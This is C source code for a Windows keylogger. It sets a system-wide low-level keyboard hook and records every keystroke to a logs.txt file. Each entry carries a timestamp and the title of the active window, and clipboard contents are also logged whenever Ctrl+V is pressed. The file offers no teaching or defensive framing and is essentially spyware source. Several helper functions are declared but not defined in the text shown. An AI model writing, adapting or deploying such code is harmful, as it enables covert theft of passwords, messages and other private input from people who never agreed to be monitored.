#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment( lib, "user32.lib") 
#pragma comment( lib, "gdi32.lib")

HHOOK _hook;
BOOL shiftIsHeld = FALSE;
BOOL capsLockActivated = FALSE;
HWND currentWindow;

char* handleSpecialCase(DWORD vkCode);
int openOrCreateFile(char* filename);
int getFolderStringLength (TCHAR* str);

int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
{
    HANDLE hFile;
    DWORD dwBytesWritten;
    char charString[1024] = {0};
    TCHAR modulePath[MAX_PATH];
    TCHAR moduleFolder[MAX_PATH];
    TCHAR logsPath[MAX_PATH];

    if(!GetModuleFileName(NULL, modulePath, MAX_PATH))
    {
        printf("Cannot find module (%d)\n", GetLastError());
        return;
    }
    strncpy_s(moduleFolder, MAX_PATH, modulePath, getFolderStringLength(modulePath));
    snprintf(logsPath, MAX_PATH, "%s\\logs.txt", moduleFolder);

    hFile = openOrCreateFile(logsPath);
    if (hFile == INVALID_HANDLE_VALUE)
        return -1;

    char* windowTitle;
    HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        int cTxtLen = GetWindowTextLength(foreground) + 1;
        windowTitle = LocalAlloc(LMEM_ZEROINIT, cTxtLen);
        GetWindowText(foreground, windowTitle, cTxtLen);
        if (!currentWindow || currentWindow != foreground)
        {
            currentWindow = foreground;
            SYSTEMTIME st;
            GetLocalTime(&st);
            PSTR header = LocalAlloc(LMEM_ZEROINIT, cTxtLen + 1024);
            snprintf(header, cTxtLen + 1024, "\n[%02d.%02d.%02d %02d:%02d:%02d] - '%s'\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond, cTxtLen == 1 ? "Desktop" : windowTitle);
            LocalFree(windowTitle); 
            WriteFile( 
                hFile,
                header,
                strlen(header),
                &dwBytesWritten,
                NULL);
            LocalFree(header); 
        }
    }

    // Special cases
    char* specialCase = handleSpecialCase(kbdStruct.vkCode);
    if (specialCase == NULL)
    {
        BOOL useUpperCase = (shiftIsHeld && !capsLockActivated) || (!shiftIsHeld && capsLockActivated);
        DWORD threadId = foreground ? GetWindowThreadProcessId(foreground, NULL) : 0;
        BYTE keyboardState[256];
        // tounicode doesn't work properly if we don't do getkeystate first DONT ASK WHY
        GetKeyState(VK_SHIFT);
        GetKeyState(VK_MENU);
        GetKeyboardState(keyboardState);
        // if control is up do not use tounicode to bypass control characters
        if (GetKeyState(VK_CONTROL) || GetKeyState(VK_LCONTROL) || GetKeyState(VK_RCONTROL))
        {
            charString[0] = useUpperCase ? kbdStruct.vkCode : tolower(kbdStruct.vkCode);
            charString[1] = '\0';
        }
        else
            ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));
    }

    WriteFile( 
        hFile,
        specialCase == NULL ? charString : specialCase,
        specialCase == NULL ? strlen(charString) : strlen(specialCase),
        &dwBytesWritten,
        NULL);

    // If a control key + v is pressed, print clipboard to logs
    if ((GetKeyState(VK_CONTROL) || GetKeyState(VK_LCONTROL) || GetKeyState(VK_RCONTROL)) && kbdStruct.vkCode == 86)
    {
        HGLOBAL   clipboardData; 
        LPTSTR    clipboardString;
        if (!IsClipboardFormatAvailable(CF_TEXT)) 
            return; 
        if (!OpenClipboard(foreground)) 
            return; 

        clipboardData = GetClipboardData(CF_TEXT); 
        if (clipboardData != NULL) 
        { 
            clipboardString = GlobalLock(clipboardData); 
            if (clipboardString != NULL) 
            { 
                printf("ADDING %s", clipboardString);
                WriteFile( 
                    hFile,
                    clipboardString,
                    strlen(clipboardString),
                    &dwBytesWritten,
                    NULL);

                GlobalUnlock(clipboardData); 
            } 
        } 
        CloseClipboard(); 
    }

    CloseHandle(hFile);
    return 1;
}

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0 || (wParam != WM_KEYUP && wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN))
        return CallNextHookEx(_hook, nCode, wParam, lParam);

    KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
    if (wParam == WM_KEYUP)
    {
        if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
            shiftIsHeld = FALSE;
    }
    // 257 is the alt key
	else if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
        if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
            shiftIsHeld = TRUE;
        if (kbdStruct.vkCode == VK_CAPITAL)
            capsLockActivated = !capsLockActivated;
        writeLogs(kbdStruct, lParam);
    }
 
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
 
void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}
 
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}
 
void main()
{

    // Infinite loop listening for messages
    SetHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

}